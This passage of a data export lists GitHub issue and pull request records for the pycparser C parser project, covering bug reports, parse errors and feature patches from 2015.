",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/109/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/109/comments,https://api.github.com/repos/eliben/pycparser/issues/109/events,https://github.com/eliben/pycparser/pull/109,https://api.github.com/repos/eliben/pycparser/pulls/109
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/108,122046339,MDExOlB1bGxSZXF1ZXN0NTM1NjY1ODk=,108,"Fix for #107 ""No coord for Prgama Node""",1473799,closed,FALSE,NA,NA,2,2015-12-14T13:49:30Z,2015-12-15T13:46:32Z,2015-12-15T13:46:23Z,CONTRIBUTOR,NA,"See #107 
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/108/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/108/comments,https://api.github.com/repos/eliben/pycparser/issues/108/events,https://github.com/eliben/pycparser/pull/108,https://api.github.com/repos/eliben/pycparser/pulls/108
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/107,121848152,MDU6SXNzdWUxMjE4NDgxNTI=,107,No coord for Pragma Node,16266234,closed,FALSE,NA,NA,2,2015-12-12T10:45:48Z,2015-12-15T13:46:23Z,2015-12-15T13:46:23Z,NONE,NA,"Hi 

when parsing the following code:
# pragma stml loop_schedule

  for(i=0;i<N;i++)
    v[N] = w[N]*w[N];

Within ""visit_Pragma(self, node)"" function of my visitor, if I print ""node.coord"" it shows ""None"". I've checked the pycparser code and it seems is not initializing properly the node coord. I'm very new to pycparser and not confident about modifying the code. Could someone please fix this issue?

Thanks.

Best.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/107/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/107/comments,https://api.github.com/repos/eliben/pycparser/issues/107/events,https://github.com/eliben/pycparser/issues/107,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/106,119502734,MDExOlB1bGxSZXF1ZXN0NTIxMzAwOTQ=,106,Problem: can't parse zeromq/czmq using fake_libc_include,8830676,closed,FALSE,NA,NA,0,2015-11-30T14:28:08Z,2015-11-30T16:33:18Z,2015-11-30T16:33:18Z,CONTRIBUTOR,NA,"Solution: add a few missing fake defines
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/106/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/106/comments,https://api.github.com/repos/eliben/pycparser/issues/106/events,https://github.com/eliben/pycparser/pull/106,https://api.github.com/repos/eliben/pycparser/pulls/106
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/105,117683863,MDU6SXNzdWUxMTc2ODM4NjM=,105,Strings with embedded newlines aren't lexed correctly,15914878,closed,FALSE,NA,NA,3,2015-11-18T21:20:27Z,2015-11-18T22:42:24Z,2015-11-18T22:42:24Z,NONE,NA,"Checked against commit fd2c7731c4d4cd225fe0a47fe6de6f528f22842c 

A string continued with a backslash doesn't seem to parse.  A short example is attached.  Perhaps C99 doesn't actually allow this?

[foo.c.txt](https://github.com/eliben/pycparser/files/38348/foo.c.txt)
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/105/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/105/comments,https://api.github.com/repos/eliben/pycparser/issues/105/events,https://github.com/eliben/pycparser/issues/105,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/104,115326148,MDU6SXNzdWUxMTUzMjYxNDg=,104,The correct way to parse multiple files and treat the resulting trees as a whole?,6127392,closed,FALSE,NA,NA,2,2015-11-05T16:50:22Z,2015-11-08T23:29:25Z,2015-11-08T23:29:25Z,CONTRIBUTOR,NA,"So if we want to parse a large library and consider it as one large syntax tree, how do we go about this?

I've briefly examined the code, and it looks like the following should suffice:

```
ast = FileAST()
for f in files:
    ast.ext += CParser().parse(file, ...).ext
do_things_with_ast(ast)
```

Is this the ""correct"" way to go about it? Is there something that this will break? (Besides the coord attribute which appears to be unused as far as I can tell)
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/104/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/104/comments,https://api.github.com/repos/eliben/pycparser/issues/104/events,https://github.com/eliben/pycparser/issues/104,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/103,114601425,MDExOlB1bGxSZXF1ZXN0NDk0MzUzNDI=,103,added function to remove comments and macros,1473799,closed,FALSE,NA,NA,1,2015-11-02T14:11:38Z,2016-02-29T14:09:14Z,2016-02-29T14:09:14Z,CONTRIBUTOR,NA,"pycparser.clean(...) supports removal of comments and macro, single and
multline. It preserves line numbers by replacing removed lines with
empty ones, but it does also remove comments contained in strings.

As mentioned in #102.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/103/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/103/comments,https://api.github.com/repos/eliben/pycparser/issues/103/events,https://github.com/eliben/pycparser/pull/103,https://api.github.com/repos/eliben/pycparser/pulls/103
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/102,114012576,MDU6SXNzdWUxMTQwMTI1NzY=,102,Ignoring comments,1473799,closed,FALSE,NA,NA,3,2015-10-29T09:37:33Z,2016-03-19T12:28:43Z,2016-03-19T12:28:43Z,CONTRIBUTOR,NA,"Would you accept a pull request which leads to ignoring comments rather than failing on them?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/102/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/102/comments,https://api.github.com/repos/eliben/pycparser/issues/102/events,https://github.com/eliben/pycparser/issues/102,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/101,110980125,MDExOlB1bGxSZXF1ZXN0NDc0MjI0ODc=,101,added support for Pragma,1473799,closed,FALSE,NA,NA,5,2015-10-12T13:58:20Z,2015-10-20T12:10:17Z,2015-10-20T12:10:13Z,CONTRIBUTOR,NA,"Is there any chance to include (optional) support for #pragma in the AST? I know it is not strictly C99, since it is supposed to be handled before and not through the AST.

Dirty patch included, just as an example.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/101/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/101/comments,https://api.github.com/repos/eliben/pycparser/issues/101/events,https://github.com/eliben/pycparser/pull/101,https://api.github.com/repos/eliben/pycparser/pulls/101
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/100,109402722,MDExOlB1bGxSZXF1ZXN0NDY1ODgzNjY=,100,Support universal wheels,413772,closed,FALSE,NA,NA,10,2015-10-01T23:13:50Z,2016-10-03T23:58:16Z,2015-10-02T12:18:11Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/100/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/100/comments,https://api.github.com/repos/eliben/pycparser/issues/100/events,https://github.com/eliben/pycparser/pull/100,https://api.github.com/repos/eliben/pycparser/pulls/100
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/99,108397891,MDU6SXNzdWUxMDgzOTc4OTE=,99,parser for FuncDecl incorrectly sets declname attribute on return type,1740543,closed,FALSE,NA,NA,3,2015-09-25T20:00:23Z,2019-06-27T12:44:54Z,2019-06-27T12:44:54Z,NONE,NA,"Steps to reproduce in the examples folder running python interpreter.

```
>>> from pycparser import parse_file, c_generator
>>> from pycparser.c_ast import *
>>> ast = parse_file(""c_files/memmgr.h"", use_cpp=True)
>>> cg = c_generator.CGenerator()
>>> cg.visit(Cast(ast.ext[-3].type.type, FuncCall(ID('test_fun'), ExprList([]))))
'(void *memmgr_alloc) test_fun()'
>>> #workaround
... ast.ext[-3].type.type.type.declname = ''
>>> cg.visit(Cast(ast.ext[-3].type.type, FuncCall(ID('test_fun'), ExprList([]))))
'(void *) test_fun()'

```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/99/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/99/comments,https://api.github.com/repos/eliben/pycparser/issues/99/events,https://github.com/eliben/pycparser/issues/99,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/98,108017549,MDU6SXNzdWUxMDgwMTc1NDk=,98,ParseError before: {,9202198,closed,FALSE,NA,NA,5,2015-09-23T22:09:22Z,2015-09-24T22:36:56Z,2015-09-24T12:09:40Z,NONE,NA,"Hello,

I'm using pycparser to simply get function name, and its coord. I created a class named CParser which extends c_ast.NodeVisitor (following func_def example), the parse method of this class I created is responsible to get such information. In addition to this information, this class also retrieves the body of each function (get_function_bodies method), by reading the file and, based on coord, consuming each line, which I use too.

It is working for several samples, but when I try to use it with a specific source code (grep source code) It gives me the following error:

Traceback (most recent call last):

```
  File ""script/pycparser_adapter/CParser.py"", line 121, in <module>
    c_file_parser.parse()
  File ""script/pycparser_adapter/CParser.py"", line 74, in parse
    ast = parse_file(file_path, use_cpp=self.use_cpp)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 146, in parse
    debug=debuglevel)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 1680, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: grep.c:3821:38: before: {
```

I debugged de code and found that the line of the original 'grep.c' is as follows:

```
kwset->trie
    = (struct trie *) obstack_alloc(&kwset->obstack, sizeof (struct trie));
```

and in the preprocessed file it is like this:

```
kwset->trie
    = (struct trie *) __extension__ ({ struct obstack *__h = (&kwset->obstack); __extension__ ({ struct obstack *__o = (__h); int __len = ((sizeof (struct trie))); if (__o->chunk_limit - __o->next_free < __len) _obstack_newchunk (__o, __len); __o->next_free += __len; (void) 0; }); __extension__ ({ struct obstack *__o1 = (__h); void *value; value = (void *) __o1->object_base; if (__o1->next_free == value) __o1->maybe_empty_object = 1; __o1->next_free = (((((__o1->next_free) - (char *) 0)+__o1->alignment_mask) & ~ (__o1->alignment_mask)) + (char *) 0); if (__o1->next_free - (char *)__o1->chunk > __o1->chunk_limit - (char *)__o1->chunk) __o1->next_free = __o1->chunk_limit; __o1->object_base = __o1->next_free; value; }); });
```

The command I'm using to preprocess the code is:

```
$ gcc -E -Ipycparser/utils/fake_libc_include/ -I. grep.c > grep_pp.c
```

Which results in some warnings:

```
grep.c:4664:0: warning: ""CALL_FREEFUN"" redefined [enabled by default]
 #define CALL_FREEFUN(h, old_chunk) \
 ^
grep.c:4656:0: note: this is the location of the previous definition
 #define CALL_FREEFUN(h, old_chunk) \
```

Even though the grep_pp.c file is created properly.

I'm also capable to compile the source code without problems using the following command:

```
$ gcc -I. grep.c -o grep.exe
```

I would really appreciate if you could help me to find a solution to this parse error.

In order to help with some tests, I'm sharing in this link ([Dropbox Grep](https://goo.gl/h4JVP8)) the Python class I did, and also the grep source code, in which tested the commands I provided bellow. Additionally, to run the python class you can use the following command:

```
$ python script/pycparser_adapter/CParser.py grep.c pycparser/utils/fake_libc_include/ .
```

which means:

```
$ python script/pycparser_adapter/CParser.py <source file> [lib_dir1 [lib_dir2...]]
```

For example, to run using directly the preprocessed file, should be like:

```
$ python script/pycparser_adapter/CParser.py grep_pp.c
```

Thanks in advance,
Geraldo
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/98/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/98/comments,https://api.github.com/repos/eliben/pycparser/issues/98/events,https://github.com/eliben/pycparser/issues/98,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/97,105915951,MDExOlB1bGxSZXF1ZXN0NDQ3MzA0MTk=,97,Fake libc include fixes,6127392,closed,FALSE,NA,NA,0,2015-09-10T23:07:48Z,2015-09-12T13:19:56Z,2015-09-12T13:19:56Z,CONTRIBUTOR,NA,"Update the MANIFEST to include fake_libc_include subdirs, add a missing define
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/97/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/97/comments,https://api.github.com/repos/eliben/pycparser/issues/97/events,https://github.com/eliben/pycparser/pull/97,https://api.github.com/repos/eliben/pycparser/pulls/97
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/96,104983626,MDU6SXNzdWUxMDQ5ODM2MjY=,96,pip fails to install fake_libc_include subdirectories,6127392,closed,FALSE,NA,NA,2,2015-09-04T22:56:08Z,2015-09-12T13:19:57Z,2015-09-12T13:19:57Z,CONTRIBUTOR,NA,"`/usr/share/python-pycparser/fake_libc_include ∰∂ ls
alloca.h   _fake_defines.h   inttypes.h  process.h    stdarg.h    tgmath.h
_ansi.h    _fake_typedefs.h  iso646.h    pthread.h    stdbool.h   time.h
argz.h     fastmath.h        langinfo.h  pwd.h        stddef.h    unctrl.h
ar.h       fcntl.h           libgen.h    reent.h      stdint.h    unistd.h
assert.h   fenv.h            limits.h    regdef.h     stdio.h     utime.h
complex.h  float.h           locale.h    sched.h      stdlib.h    utmp.h
ctype.h    getopt.h          malloc.h    search.h     string.h    wchar.h
dirent.h   grp.h             math.h      semaphore.h  _syslist.h  wctype.h
envz.h     iconv.h           newlib.h    setjmp.h     tar.h
errno.h    ieeefp.h          paths.h     signal.h     termios.h`

No `sys/`, `arpa/`, `linux/`, `netinet/`, `openssl/` or other directories. `sudo pip3 install --force-reinstall pycparser --upgrade` failed to rectify the issue
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/96/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/96/comments,https://api.github.com/repos/eliben/pycparser/issues/96/events,https://github.com/eliben/pycparser/issues/96,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/95,103826665,MDExOlB1bGxSZXF1ZXN0NDM2ODgwNTU=,95,Add support for C11 atomics.,635076,closed,FALSE,NA,NA,2,2015-08-29T03:50:55Z,2016-03-19T12:29:24Z,2016-03-19T12:29:19Z,CONTRIBUTOR,NA,"Adds the _Atomic type qualifier & specifier and atomic headers. I'll address a couple of design decisions that I made:

The first is the split between the ATOMIC_QUALIFIER and ATOMIC_SPECIFIER tokens, rather than just using a single _ATOMIC keyword token. According to the C11 spec: _""If  the _Atomic keyword is immediately followed by a left parenthesis, it is interpreted as a type specifier (with a type name), not as a type qualifier""_ (6.7.2.4). It seemed easier to let the lexer handle this with a quick look-ahead. I did a cursory test with a single token, but it results in a shift/reduce conflict (I imagine there's a way to write the grammar around this, but that's not my forte). Tests still pass, but I think it's more explicit/robust this way.

In order to meet the condition that _""The type name in an atomic type specifier shall not refer to an array type, a function type, an atomic type, or a qualified type.""_ (6.7.2.4) the parser needed to become aware of the actual type represented by a typedef, so I modified the way the internal _scope_stack works. Rather than holding True/False it holds the c_ast.Typedef or None in the case of identifier objects. This allows the production for the atomic specifier to inspect the type to make sure it follows the rules.

I added _stdatomic.h_ and _uchar.h_, but I kept the macros and typedefs in their respective files, despite convention to put them in the __fake_x.h_ files. I figured, at least in the case of the atomic types, there was potential for naming conflicts with libraries that are still in C99 land, so excluding those from always getting included could be a good thing. For the _ATOMIC_X_LOCK_FREE_ macros I chose the value of 1 because _""a value of 1 indicates that the type is sometimes lock-free""_ (7.17.5), which I think best reflects pycparser's usage in which a potential target compiler's support is unknown.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/95/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/95/comments,https://api.github.com/repos/eliben/pycparser/issues/95/events,https://github.com/eliben/pycparser/pull/95,https://api.github.com/repos/eliben/pycparser/pulls/95
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/94,97923703,MDU6SXNzdWU5NzkyMzcwMw==,94,Extract all extern function from c ?,6859464,closed,FALSE,NA,NA,3,2015-07-29T12:20:10Z,2015-08-03T13:53:12Z,2015-08-02T13:40:37Z,NONE,NA,"Is it possible to extract all the external functions that are usable from this c/c++ lib ?
https://www.libsdl.org/index.php
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/94/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/94/comments,https://api.github.com/repos/eliben/pycparser/issues/94/events,https://github.com/eliben/pycparser/issues/94,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/93,96005762,MDU6SXNzdWU5NjAwNTc2Mg==,93,in examples:cdecl.py,41779,closed,FALSE,NA,NA,1,2015-07-20T07:51:51Z,2017-02-26T13:57:09Z,2017-02-26T13:57:09Z,NONE,NA,"cdecl.py doesn't recognize the structure declaration, for e.g.
<code>
cdecl.py ""struct P {int x; int y} p;""
</code>
returns 
<code>
return quals + _explain_type(decl.type)

TypeError: cannot concatenate 'str' and 'NoneType' objects
</code>
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/93/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/93/comments,https://api.github.com/repos/eliben/pycparser/issues/93/events,https://github.com/eliben/pycparser/issues/93,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/92,93842846,MDExOlB1bGxSZXF1ZXN0Mzk1MDAzOTU=,92,Modify AST calculation to include column values.,12444051,closed,FALSE,NA,NA,3,2015-07-08T17:09:35Z,2016-03-19T12:29:03Z,2016-03-19T12:29:03Z,NONE,NA,"Column values were not being set in the AST.  Changes to pycparser/c_parser.py now set the coord.column value.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/92/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/92/comments,https://api.github.com/repos/eliben/pycparser/issues/92/events,https://github.com/eliben/pycparser/pull/92,https://api.github.com/repos/eliben/pycparser/pulls/92
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/91,93815676,MDU6SXNzdWU5MzgxNTY3Ng==,91,Error while using VC compiler for pycparsing preprocess file,12977763,closed,FALSE,NA,NA,8,2015-07-08T15:15:13Z,2016-03-19T12:25:01Z,2016-03-19T12:25:01Z,NONE,NA,"cl : Compiler in VC(Visual C)
Using the below cmdline : 
cl test.c /c /Iutils/fake_libc_include
cpp_path=cl, filename=test.c,cpp_args=[ /c, /Iutils/fake_libc_include]
/c : Compiles without linking.
Do i use /c or not while passing all the arguments to the parse_file function in pycparser?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/91/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/91/comments,https://api.github.com/repos/eliben/pycparser/issues/91/events,https://github.com/eliben/pycparser/issues/91,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/90,93339365,MDU6SXNzdWU5MzMzOTM2NQ==,90,Error while preprocessing .c files with many -I options,12977763,closed,FALSE,NA,NA,5,2015-07-06T18:08:31Z,2016-03-19T12:24:32Z,2016-03-19T12:24:23Z,NONE,NA,"  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\rfa_rf_wcdma_rf_mc.scons"", line 295:

```
gen_xml.parse_dir(['D:/builds/OfFTargetSetup/TA1_0TA10_offtarget_2015_05_14_00_21_20/modem_proc/rftech_wcdma/rf/mc/src'],env['CPPPATH'],env['INC_ROOT'])
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\gen_xml.py"", line 261:

```
debugs(c_file,conf_root,""log.txt"",inc,general)
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\gen_xml.py"", line 89:

```
ast = parse_file(filename, use_cpp=True,cpp_path='gcc',cpp_args=cppargs)
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\pycparser__init__.py"", line 93:

```
return parser.parse(text, filename)
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\pycparser\c_parser.py"", line 146:

```
debug=debuglevel)
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\pycparser\ply\yacc.py"", line 265:

```
return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\pycparser\ply\yacc.py"", line 971:

```
p.callable(pslice)
```

  File ""D:\Builds\OfFTargetSetup\TA1_0TA10_offtarget_2015_05_14_00_21_20\modem_proc\rftech_wcdma\rf\mc\build\pycparser\c_parser.py"", line 583:

```
body=p[4])
```

assert 'typedef' not in spec['storage']
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/90/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/90/comments,https://api.github.com/repos/eliben/pycparser/issues/90/events,https://github.com/eliben/pycparser/issues/90,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/89,89001520,MDU6SXNzdWU4OTAwMTUyMA==,89,Missing fake-defines for C99 format macro constants,12815412,closed,FALSE,NA,NA,1,2015-06-17T12:17:05Z,2018-03-12T12:38:45Z,2018-03-12T12:38:45Z,CONTRIBUTOR,NA,"See http://en.cppreference.com/w/c/types/integer

The one I specifically ran into was `PRIu64`.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/89/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/89/comments,https://api.github.com/repos/eliben/pycparser/issues/89/events,https://github.com/eliben/pycparser/issues/89,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/88,87446590,MDU6SXNzdWU4NzQ0NjU5MA==,88,function declarations are incorrect,5903665,closed,FALSE,NA,NA,1,2015-06-11T18:52:40Z,2016-03-19T12:29:59Z,2016-03-19T12:29:59Z,NONE,NA,"Example:

$ python c-to-c.py c_files/funky.c
char foo[)]
{
  return '1';
}

int maxout_in[)]
{
  char o = foo();
  return (((int) matrix[1][2]) \* 5) - paste;
}

int main[)]
{
  auto char *multi = ""a multi"";
}
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/88/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/88/comments,https://api.github.com/repos/eliben/pycparser/issues/88/events,https://github.com/eliben/pycparser/issues/88,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/87,87327651,MDU6SXNzdWU4NzMyNzY1MQ==,87,offsetof() support is incomplete,12815412,closed,FALSE,NA,NA,10,2015-06-11T12:22:39Z,2017-04-10T18:28:08Z,2016-09-10T15:27:49Z,CONTRIBUTOR,NA,"pycparser 2.13 added support for offsetof, and it is listed in the CHANGES file as ""offsetof() the way gcc implements it"". However, there are two differences between gcc's implemenation and pycparser's.

The important one: pycparser defines the syntax for `offsetof()` as 

```
        primary_expression  : OFFSETOF LPAREN type_name COMMA identifier RPAREN
```

but [gcc defines it](https://gcc.gnu.org/onlinedocs/gcc-4.9.1/gcc/Offsetof.html) as 

```
     primary:
             ""__builtin_offsetof"" ""("" typename "","" offsetof_member_designator "")""

     offsetof_member_designator:
               identifier
             | offsetof_member_designator ""."" identifier
             | offsetof_member_designator ""["" expr ""]""

```

The less important one (also visible above) is that gcc supports spelling `offsetof` as `__builtin_offsetof`.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/87/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/87/comments,https://api.github.com/repos/eliben/pycparser/issues/87/events,https://github.com/eliben/pycparser/issues/87,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/86,87214779,MDExOlB1bGxSZXF1ZXN0Mzc0Mjk1OTM=,86,Eliminate references to undefined initializer_list_opt,352067,closed,FALSE,NA,NA,2,2015-06-11T05:12:12Z,2015-06-12T02:01:05Z,2015-06-11T05:30:53Z,NONE,NA,"The symbol `initializer_list_opt` is not defined anywhere. Mysteriously, pycparser's tests pass nonetheless, but pycparserext breaks.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/86/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/86/comments,https://api.github.com/repos/eliben/pycparser/issues/86/events,https://github.com/eliben/pycparser/pull/86,https://api.github.com/repos/eliben/pycparser/pulls/86
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/85,86643326,MDExOlB1bGxSZXF1ZXN0MzcyNjc5MTI=,85,Remove cpp.exe/license and make a new release,288304,closed,FALSE,NA,NA,2,2015-06-09T15:44:55Z,2015-06-10T03:03:22Z,2015-06-10T03:03:22Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/85/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/85/comments,https://api.github.com/repos/eliben/pycparser/issues/85/events,https://github.com/eliben/pycparser/pull/85,https://api.github.com/repos/eliben/pycparser/pulls/85
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/84,86641382,MDExOlB1bGxSZXF1ZXN0MzcyNjcyMjQ=,84,Added taboutputdir parameter to control outputdir for tab files,12815412,closed,FALSE,NA,NA,1,2015-06-09T15:38:51Z,2015-06-10T02:56:39Z,2015-06-10T02:56:28Z,CONTRIBUTOR,NA,"We are using a pycparser-derived parser in our  build process, and without this argument, it tended to leave {lex,yacc}tab.py files lying around. This way we can make sure they are generated as needed and cleaned up properly.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/84/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/84/comments,https://api.github.com/repos/eliben/pycparser/issues/84/events,https://github.com/eliben/pycparser/pull/84,https://api.github.com/repos/eliben/pycparser/pulls/84
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/83,84558823,MDU6SXNzdWU4NDU1ODgyMw==,83,Make the use of __slots__ optional,7703247,closed,FALSE,NA,NA,3,2015-06-03T13:17:29Z,2016-10-06T14:02:15Z,2016-10-06T14:02:15Z,NONE,NA,"The recent move to use `__slots__` in `c_ast.py` has broken a fair bit of my code. I pickle ASTs with arbitrary extended attributes, and both of these features now fail. Yes, I can work around them. However, in my opinion, the power of pycparser over something faster and more complete like libclang is the flexibility of Python, which `__slots__` undermines. (If speed is required, pypy executes pycparser about 3 times faster than CPython in my testing.) I think `__slots__` should be optional, if possible.

I forked and attempted to do this but this is hard to do in a way which has minimal impact on your code. I'd be willing to help, but I wanted to speak to you before working on a massive PR which you would understandably reject.

Currently my solution is a nasty monkey patch which I run before using pycparser which iterates through all the classes in c_ast.py, replacing them with clone classes with the same `__dict__` as the original but with the `__slots__` and member attributes removed to restore original behaviour.

Link to Reddit discussion for reference - http://www.reddit.com/r/Python/comments/38alfw/trying_to_define_a_class_which_can_optionally_use/
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/83/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/83/comments,https://api.github.com/repos/eliben/pycparser/issues/83/events,https://github.com/eliben/pycparser/issues/83,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/82,79760609,MDU6SXNzdWU3OTc2MDYwOQ==,82,Not possible to serialize the AST,873464,closed,FALSE,NA,NA,3,2015-05-23T07:12:00Z,2017-02-22T04:10:47Z,2017-02-22T04:10:47Z,NONE,NA,"`pickle.dump` can't handle ast because the `ast` class uses `__slots__` but doesn't implement `__getstate__`. 

It'd be useful to add that functionality. Use case: parse a large repository once and store the ast for further processing. This way the source tree is parsed only once, saving time.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/82/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/82/comments,https://api.github.com/repos/eliben/pycparser/issues/82/events,https://github.com/eliben/pycparser/issues/82,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/81,75357950,MDU6SXNzdWU3NTM1Nzk1MA==,81,Crases when tries to parse a cast to (FILE*) or definition of type FILE*,4673156,closed,FALSE,NA,NA,2,2015-05-11T21:09:27Z,2015-05-11T23:07:58Z,2015-05-11T23:07:58Z,NONE,NA,"example c_to_c crases with error 
  File ""C:\Python34\lib\site-packages\pycparser\plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: .\c_files\main.c:53:18: before: )

main.c file is available here https://drive.google.com/file/d/0B0iD1x-xUUzoR2wzVW00ckNxdDQ/view?usp=sharing

Lines that raises the error, all caintain FILE*. This is standard type of file.
